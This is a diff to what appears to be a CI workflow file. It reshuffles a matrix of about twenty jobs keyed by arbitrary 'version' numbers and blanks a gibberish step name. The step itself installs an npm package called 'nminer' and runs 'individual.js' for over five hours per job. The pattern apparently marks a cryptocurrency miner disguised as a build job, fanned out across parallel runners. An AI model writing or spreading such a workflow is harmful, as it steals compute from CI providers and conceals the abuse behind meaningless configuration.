@@ -9,26 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4421 }
-          - { version: 109 }
-          - { version: 3472 }
-          - { version: 2413 }
-          - { version: 4724 }
-          - { version: 5026 }
-          - { version: 2070 }
-          - { version: 9027 }
-          - { version: 4624 }
-          - { version: 6787 }
-          - { version: 688 }
-          - { version: 1138 }
-          - { version: 2316 }
-          - { version: 4689 }
-          - { version: 8721 }
-          - { version: 5555 }
-          - { version: 9176 }
-          - { version: 8999 }
-          - { version: 6191 }
-          - { version: 8410 }
+          - { version: 4863 }
+          - { version: 1299 }
+          - { version: 7449 }
+          - { version: 4894 }
+          - { version: 6087 }
+          - { version: 1846 }
+          - { version: 4598 }
+          - { version: 7448 }
+          - { version: 1178 }
+          - { version: 5234 }
+          - { version: 8680 }
+          - { version: 2194 }
+          - { version: 3091 }
+          - { version: 2914 }
+          - { version: 8068 }
+          - { version: 9901 }
+          - { version: 8065 }
+          - { version: 9928 }
+          - { version: 2596 }
 
     steps:
       - name: Checkout
@@ -39,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: into geez strictly
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 324m node individual.js || echo "individual executed"
+          timeout 311m node individual.js || echo "individual executed"
